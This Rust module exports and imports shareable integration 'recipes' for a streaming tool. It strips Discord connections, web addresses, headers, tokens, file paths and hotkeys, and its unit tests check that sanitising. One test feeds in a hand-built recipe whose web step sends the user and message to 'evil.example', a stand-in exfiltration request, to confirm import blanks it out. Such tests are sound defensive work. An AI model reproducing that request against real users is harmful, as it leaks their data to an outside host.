//! Recipes: integrations shared as a line of text (`ic-recipe:1:...`).
//!
//! A recipe is data, never code, and carries nothing private:
//! - Discord connections are replaced by a placeholder; the importer picks
//!   one of their own connections for it.
//! - Web call links get new secret tokens on import, and buttons a new
//!   Stream Deck address.
//! - Hotkeys and MIDI pads are left for the importer to pick: a pad names
//!   the sharer's controller, and their keys may be taken on another PC.
//! - Everything imported arrives switched off.
//! - Steps that run programs or write files are flagged, and the import
//!   needs an explicit yes for them.
//!
//! Import cleans exactly what export does, so a recipe written by hand
//! can't bring in a web address, a program or a hotkey the user never set.

use super::model::{visit_steps, Integration, StepKind, Trigger};
use crate::json::{self, Value};

const PREFIX: &str = "ic-recipe:1:";
/// Placeholder a shared Discord step points at until the importer maps it.
pub const DISCORD_PLACEHOLDER: &str = "@discord";
const MAX_RECIPE_LEN: usize = 256 * 1024;
const MAX_RECIPE_INTEGRATIONS: usize = 20;

pub struct Recipe {
    pub name: String,
    pub integrations: Vec<Integration>,
}

impl Recipe {
    pub fn uses_discord(&self) -> bool {
        self.integrations.iter().any(|i| {
            let mut found = false;
            for h in &i.handlers {
                visit_steps(&h.steps, &mut |s| found |= s.kind == StepKind::Discord);
            }
            found
        })
    }

    pub fn has_local_effects(&self) -> bool {
        self.integrations.iter().any(Integration::has_local_effects)
    }
}

pub fn export(name: &str, integrations: &[Integration]) -> String {
    let cleaned: Vec<Value> = integrations
        .iter()
        .map(|i| {
            let mut i = i.clone();
            make_private(&mut i);
            i.to_json()
        })
        .collect();
    let doc = json::obj([
        ("name", json::str(name)),
        ("integrations", Value::Arr(cleaned)),
    ]);
    format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()))
}

/// Blank whatever a recipe must never carry: see `strip_private`, plus web
/// call tokens and the hotkey, pad or Stream Deck address a button starts
/// from.
fn make_private(i: &mut Integration) {
    for h in &mut i.handlers {
        strip_private(&mut h.steps);
        match &mut h.trigger {
            Trigger::Webhook { token } => token.clear(),
            Trigger::Shortcut {
                hotkey,
                midi,
                token,
                ..
            } => {
                hotkey.clear();
                midi.clear();
                token.clear();
            }
            _ => {}
        }
    }
}

/// Whether a web request body is one the catalog itself writes (an on-air
/// light state, the webhook's event JSON): those only say what happened,
/// so a recipe keeps them, or an imported light would send nothing a
/// device reads. Any other body can hold a key and goes. Judged by the
/// body itself, never by what the recipe says it is.
fn is_catalog_body(body: &str) -> bool {
    super::presets::LIGHT_STARTS
        .iter()
        .any(|light| light.bodies.contains(&body))
        || super::event::EventKind::ALL
            .iter()
            .any(|kind| body == super::presets::webhook_body(*kind))
}

/// The Discord connection, web requests (address, headers and body hold
/// API keys and webhook secrets), programs and files (their paths and
/// arguments name the user's folders and carry tokens), and OBS steps'
/// scene and source: the importer picks their own, so a recipe can never
/// switch a scene or hide a source the user didn't choose.
fn strip_private(steps: &mut [super::model::Step]) {
    for s in steps {
        match s.kind {
            StepKind::Discord => {
                s.params
                    .insert("connection".into(), DISCORD_PLACEHOLDER.into());
            }
            StepKind::Http => {
                s.params.insert("url".into(), String::new());
                s.params.remove("headers");
                if !is_catalog_body(s.param("body")) {
                    s.params.remove("body");
                }
            }
            StepKind::Obs => {
                s.params.insert("scene".into(), String::new());
                s.params.insert("source".into(), String::new());
            }
            StepKind::Program => {
                s.params.insert("path".into(), String::new());
                s.params.remove("args");
            }
            StepKind::File => {
                s.params.insert("path".into(), String::new());
            }
            _ => {}
        }
        strip_private(&mut s.then);
        strip_private(&mut s.otherwise);
    }
}

/// Parse a pasted recipe. `new_id` makes fresh ids so an import never
/// overwrites what the user already has.
pub fn parse(text: &str, mut new_id: impl FnMut() -> String) -> Result<Recipe, String> {
    let text = text.trim();
    if text.len() > MAX_RECIPE_LEN {
        return Err("that recipe is too big".to_string());
    }
    let encoded = text
        .strip_prefix(PREFIX)
        .ok_or("that is not an InstantClone recipe (it should start with ic-recipe:1:)")?;
    let bytes = base64url_decode(encoded).ok_or("the recipe is damaged; copy it again")?;
    let doc = std::str::from_utf8(&bytes)
        .ok()
        .and_then(|t| json::parse(t).ok())
        .ok_or("the recipe is damaged; copy it again")?;
    let list = doc
        .get("integrations")
        .and_then(Value::as_array)
        .unwrap_or(&[]);
    if list.is_empty() || list.len() > MAX_RECIPE_INTEGRATIONS {
        return Err("the recipe has no integrations, or too many".to_string());
    }
    let mut integrations = Vec::new();
    for v in list {
        let mut i = Integration::from_json(v)?;
        if let Some(problem) = i.problems().invalid.first() {
            return Err(format!(
                "the recipe has something unsafe or broken: {problem}"
            ));
        }
        make_private(&mut i);
        i.id = new_id();
        i.enabled = false;
        // Fresh secrets: a web call keeps working, and a button can be
        // pressed from a Stream Deck before any key or pad is picked.
        for h in &mut i.handlers {
            match &mut h.trigger {
                Trigger::Webhook { token } | Trigger::Shortcut { token, .. } => {
                    *token = new_id() + &new_id();
                }
                _ => {}
            }
        }
        integrations.push(i);
    }
    Ok(Recipe {
        name: doc
            .str_or("name", "Shared recipe")
            .chars()
            .take(80)
            .collect(),
        integrations,
    })
}

/// Point every placeholder Discord step at `channel`.
pub fn map_discord(recipe: &mut Recipe, channel: &str) {
    for i in &mut recipe.integrations {
        for h in &mut i.handlers {
            map_steps(&mut h.steps, channel);
        }
    }
}

fn map_steps(steps: &mut [super::model::Step], channel: &str) {
    for s in steps {
        if s.kind == StepKind::Discord && s.param("connection") == DISCORD_PLACEHOLDER {
            s.params.insert("connection".into(), channel.to_string());
        }
        map_steps(&mut s.then, channel);
        map_steps(&mut s.otherwise, channel);
    }
}

const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

fn base64url_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let n = chunk.iter().fold(0u32, |acc, b| (acc << 8) | *b as u32) << (8 * (3 - chunk.len()));
        for i in 0..=chunk.len() {
            out.push(ALPHABET[((n >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

fn base64url_decode(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(text.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0;
    for c in text
        .bytes()
        .filter(|c| !c.is_ascii_whitespace() && *c != b'=')
    {
        let v = ALPHABET.iter().position(|a| *a == c)? as u32;
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::super::presets;
    use super::*;

    #[test]
    fn base64_round_trips_every_length() {
        for len in 0..40 {
            let data: Vec<u8> = (0..len).map(|i| (i * 37 + 11) as u8).collect();
            assert_eq!(base64url_decode(&base64url_encode(&data)).unwrap(), data);
        }
        assert!(base64url_decode("abc*").is_none());
    }

    #[test]
    fn export_hides_connections_and_import_starts_off() {
        let alert = presets::build("crash_alert", "a1".into(), "my-private-channel").unwrap();
        let text = export("Crash kit", &[alert]);
        assert!(text.starts_with(PREFIX));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("my-private-channel"));

        let mut n = 0;
        let mut recipe = parse(&text, || {
            n += 1;
            format!("new{n}")
        })
        .unwrap();
        assert_eq!(recipe.name, "Crash kit");
        assert!(recipe.uses_discord());
        let imported = &recipe.integrations[0];
        assert_eq!(imported.id, "new1");
        assert!(!imported.enabled);

        map_discord(&mut recipe, "mine");
        assert_eq!(
            recipe.integrations[0].handlers[0].steps[0].param("connection"),
            "mine"
        );
    }

    #[test]
    fn addresses_headers_and_paths_are_never_shared() {
        use super::super::model::Step;
        let mut i = presets::build("webhook", "w".into(), "").unwrap();
        i.handlers[0].steps = vec![
            Step::new(
                StepKind::Http,
                &[
                    ("url", "https://api.example/secret-key"),
                    ("headers", "Authorization: Bearer s3cret"),
                ],
            ),
            Step::new(
                StepKind::File,
                &[("path", r"C:\Users\oriol\stream.txt"), ("text", "x")],
            ),
        ];
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        for secret in ["secret-key", "s3cret", "oriol"] {
            assert!(!decoded.contains(secret), "{secret} leaked");
        }
    }

    #[test]
    fn web_call_tokens_are_never_shared() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Webhook {
            token: "secret-token-1234567890".into(),
        };
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("secret-token"));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        match &recipe.integrations[0].handlers[0].trigger {
            Trigger::Webhook { token } => assert!(token.starts_with("fresh")),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn shortcuts_are_left_for_the_importer() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+Alt+K".into(),
            midi: "note:1:36@Oriol's Launchpad".into(),
            token: String::new(),
            only_live: false,
        };
        let text = export("x", &[i]);
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("Launchpad") && !decoded.contains("Ctrl+Alt+K"));
        assert!(
            parse(&text, || "fresh1234567890ab".into()).is_ok(),
            "still imports, unfinished"
        );
    }

    #[test]
    fn a_shared_light_keeps_what_each_state_sends_and_buttons_get_an_address() {
        let light = presets::build("on_air_light", "l".into(), "").unwrap();
        let highlight = presets::build("highlight", "h".into(), "").unwrap();
        let text = export("studio", &[light, highlight]);
        let mut n = 0;
        let recipe = parse(&text, || {
            n += 1;
            format!("fresh{n:011}")
        })
        .unwrap();
        let body = recipe.integrations[0].handlers[0].steps[0].param("body");
        assert!(body.contains("state"), "{body}");
        assert_eq!(recipe.integrations[0].handlers[0].steps[0].param("url"), "");
        match &recipe.integrations[1].handlers[0].trigger {
            Trigger::Shortcut { token, hotkey, .. } => {
                assert!(token.starts_with("fresh") && hotkey.is_empty(), "{token}")
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn a_recipe_never_picks_an_obs_scene_or_a_made_up_body() {
        use super::super::model::Step;
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.preset = "on_air_light".into();
        i.handlers[0].steps = vec![
            Step::new(StepKind::Obs, &[("action", "hide"), ("source", "Camera")]),
            Step::new(
                StepKind::Http,
                &[("url", "https://x.example/"), ("body", "key=secret")],
            ),
        ];
        let recipe = parse(&export("x", &[i]), || "fresh1234567890ab".into()).unwrap();
        let steps = &recipe.integrations[0].handlers[0].steps;
        assert_eq!(steps[0].param("source"), "");
        assert_eq!(
            steps[1].param("body"),
            "",
            "claiming to be a light keeps nothing"
        );
    }

    #[test]
    fn a_hand_written_recipe_is_cleaned_on_import() {
        use super::super::model::Step;
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+C".into(),
            midi: String::new(),
            token: String::new(),
            only_live: false,
        };
        i.handlers[0].steps = vec![Step::new(
            StepKind::Http,
            &[
                ("url", "https://evil.example/?u={user}"),
                ("body", "{message}"),
            ],
        )];
        // Encoded by hand, skipping the cleaning `export` does.
        let doc = json::obj([("integrations", Value::Arr(vec![i.to_json()]))]);
        let text = format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        let h = &recipe.integrations[0].handlers[0];
        assert_eq!(h.steps[0].param("url"), "");
        assert_eq!(h.steps[0].param("body"), "");
        assert!(matches!(&h.trigger, Trigger::Shortcut { hotkey, .. } if hotkey.is_empty()));
    }

    #[test]
    fn junk_is_refused_politely() {
        assert!(parse("hello", || "x".into()).is_err());
        assert!(parse("ic-recipe:1:!!!", || "x".into()).is_err());
        assert!(
            parse(&format!("{PREFIX}{}", base64url_encode(b"{}")), || "x"
                .into())
            .is_err()
        );
    }
}
